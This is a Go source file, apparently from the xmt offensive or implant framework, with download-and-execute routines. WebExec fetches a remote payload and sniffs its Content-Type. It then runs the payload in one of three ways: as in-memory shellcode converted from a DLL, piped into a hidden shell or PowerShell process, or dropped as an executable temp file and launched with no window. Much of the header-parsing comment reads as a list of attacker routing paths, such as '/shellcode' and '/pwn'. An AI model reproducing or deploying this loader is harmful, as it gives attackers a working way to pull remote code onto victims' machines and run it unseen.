// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package man

import (
	"bytes"
	"context"
	"io"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
	"sync"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/text"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

var client struct {
	_ [0]func()
	sync.Once
	v *http.Client
}

func initDefaultClient() {
	j, _ := cookiejar.New(nil)
	client.v = &http.Client{
		Jar: j,
		Transport: &http.Transport{
			Proxy:                 device.Proxy,
			DialContext:           (&net.Dialer{Timeout: timeoutWeb, KeepAlive: timeoutWeb}).DialContext,
			MaxIdleConns:          64,
			IdleConnTimeout:       timeoutWeb * 2,
			DisableKeepAlives:     true,
			ForceAttemptHTTP2:     false,
			TLSHandshakeTimeout:   timeoutWeb,
			ExpectContinueTimeout: timeoutWeb,
			ResponseHeaderTimeout: timeoutWeb,
		},
	}
}
func rawParse(r string) (*url.URL, error) {
	var (
		i   = strings.IndexRune(r, '/')
		u   *url.URL
		err error
	)
	if i == 0 && len(r) > 2 && r[1] != '/' {
		u, err = url.Parse("/" + r)
	} else if i == -1 || i+1 >= len(r) || r[i+1] != '/' {
		u, err = url.Parse("//" + r)
	} else {
		u, err = url.Parse(r)
	}
	if err != nil {
		return nil, err
	}
	if len(u.Host) == 0 {
		return nil, xerr.Sub("empty host field", 0x65)
	}
	if u.Host[len(u.Host)-1] == ':' {
		return nil, xerr.Sub("invalid port specified", 0x66)
	}
	if len(u.Scheme) == 0 {
		u.Scheme = com.NameHTTP
	}
	return u, nil
}

// ParseDownloadHeader converts HTTP headers into index-based output types.
//
// Resulting output types:
// - 0: None found.
// - 1: DLL.
// - 2: Assembly Code (ASM).
// - 3: Shell Script.
// - 4: PowerShell Script.
//
// Ignores '*/' prefix.
//
// # Examples
//
// DLL:
//   - '/d'
//   - '/dll'
//   - '/dontcare'
//   - '/dynamic'
//   - '/dynamiclinklib'
//
// Assembly Code:
//   - '/a'
//   - '/b'
//   - '/asm'
//   - '/bin'
//   - '/assembly'
//   - '/binary'
//   - '/code'
//   - '/shellcode'
//   - '/superscript'
//   - '/shutupbro'
//
// Shell Script:
//   - '/x'
//   - '/s'
//   - '/cm'
//   - '/cmd'
//   - '/xgongiveittoya'
//   - '/xecute'
//   - '/xe'
//   - '/com'
//   - '/command'
//   - '/shell'
//   - '/sh'
//   - '/script'
//
// PowerShell:
//   - '/p'
//   - '/pwsh'
//   - '/powershell'
//   - '/power'
//   - '/powerwash'
//   - '/powerwashing'
//   - '/powerwashingsimulator'
//   - '/pwn'
//   - '/pwnme'
func ParseDownloadHeader(h http.Header) uint8 {
	if len(h) == 0 {
		return 0
	}
	var c string
	for k, v := range h {
		if len(k) < 12 {
			continue
		}
		if k[0] != 'C' && k[0] != 'c' && k[8] != '-' && k[9] != 'T' && k[9] != 't' {
			continue
		}
		if len(v) == 0 || len(v[0]) == 0 {
			continue
		}
		c = v[0]
		break
	}
	if len(c) == 0 {
		return 0
	}
	x := strings.IndexByte(c, '/')
	if x < 1 || x >= len(c) {
		return 0
	}
	x++
	switch n := len(c) - x; {
	case c[x] == 'd': // Covers all '/d*' for DLL.
		if cmd.LoaderEnabled { // Return ASM type instead when we can convert it.
			return 2
		}
		return 1
	case c[x] == 'p': // Covers all '/p*' for PowerShell.
		return 4
	case c[x] == 'x': // Covers all '/x*' for Shell Execute.
		return 3
	case c[x] == 'a' || c[x] == 'b': // Covers '/a*' and '/b*' for ASM.
		return 2
	case n > 1 && c[x] == 'c' && c[x+1] == 'm': // Covers '/cm*' for Script.
		fallthrough
	case n > 2 && c[x] == 'c' && c[x+1] == 'o' && c[x+2] == 'm': // Covers '/com*' for Script.
		return 3
	case c[x] == 'c': // Covers '/c*' for ASM.
		fallthrough
	case n > 6 && c[x] == 's' && c[x+1] != 'c': // Covers '/shellcode' for ASM.
		return 2
	case c[x] == 's': // Covers '/s*' for Script.
		return 3
	}
	return 0
}

// WebRequest is a utility function that allows for piggybacking off the Sentinel
// downloader, which is only initialized once used.
//
// The first two strings are the URL and the User-Agent (which can be empty).
//
// User-Agent strings can be supplied that use the text.Matcher format for dynamic
// values. If empty, a default Firefox string will be used instead.
func WebRequest(x context.Context, url, agent string) (*http.Response, error) {
	r, _ := http.NewRequestWithContext(x, http.MethodGet, "*", nil)
	if client.Do(initDefaultClient); len(agent) > 0 {
		r.Header.Set(userAgent, text.Matcher(agent).String())
	} else {
		r.Header.Set(userAgent, userValue)
	}
	var err error
	if r.URL, err = rawParse(url); err != nil {
		return nil, err
	}
	return client.v.Do(r)
}

// WebExec will attempt to download the URL target at 'url' and parse the
// data into a Runnable interface.
//
// The supplied 'agent' string (if non-empty) will specify the User-Agent header
// string to be used.
//
// The passed Writer will be passed as Stdout/Stderr to certain processes if
// the Writer "w" is not nil.
//
// The returned string is the full expanded path if a temporary file is created.
// It's the callers responsibility to delete this file when not needed.
//
// This function uses the 'man.ParseDownloadHeader' function to assist with
// determining the executable type.
func WebExec(x context.Context, w data.Writer, url, agent string) (cmd.Runnable, string, error) {
	o, err := WebRequest(x, url, agent)
	if err != nil {
		return nil, "", err
	}
	b, err := io.ReadAll(o.Body)
	if o.Body.Close(); err != nil {
		return nil, "", err
	}
	if bugtrack.Enabled {
		bugtrack.Track("man.WebExec(): Download url=%s, agent=%s", agent, url)
	}
	var d bool
	switch ParseDownloadHeader(o.Header) {
	case 1:
		d = true
	case 2:
		if bugtrack.Enabled {
			bugtrack.Track("man.WebExec(): Download is shellcode url=%s", url)
		}
		return cmd.NewAsmContext(x, cmd.DLLToASM("", b)), "", nil
	case 3:
		c := cmd.NewProcessContext(x, device.Shell)
		c.SetNoWindow(true)
		if c.SetWindowDisplay(0); w != nil {
			c.Stdout, c.Stderr = w, w
		}
		c.Stdin = bytes.NewReader(b)
		return c, "", nil
	case 4:
		c := cmd.NewProcessContext(x, device.PowerShell)
		c.SetNoWindow(true)
		if c.SetWindowDisplay(0); w != nil {
			c.Stdout, c.Stderr = w, w
		}
		c.Stdin = bytes.NewReader(b)
		return c, "", nil
	}
	var n string
	if d {
		n = execB
	} else if device.OS == device.Windows {
		n = execC
	} else {
		n = execA
	}
	f, err := os.CreateTemp("", n)
	if err != nil {
		return nil, "", err
	}
	n = f.Name()
	_, err = f.Write(b)
	if f.Close(); err != nil {
		return nil, n, err
	}
	if b = nil; bugtrack.Enabled {
		bugtrack.Track("man.WebExec(): Download to temp file url=%s, n=%s", url, n)
	}
	if os.Chmod(n, 0755); d {
		return cmd.NewDLLContext(x, n), n, nil
	}
	c := cmd.NewProcessContext(x, n)
	c.SetNoWindow(true)
	if c.SetWindowDisplay(0); w != nil {
		c.Stdout, c.Stderr = w, w
	}
	return c, n, nil
}
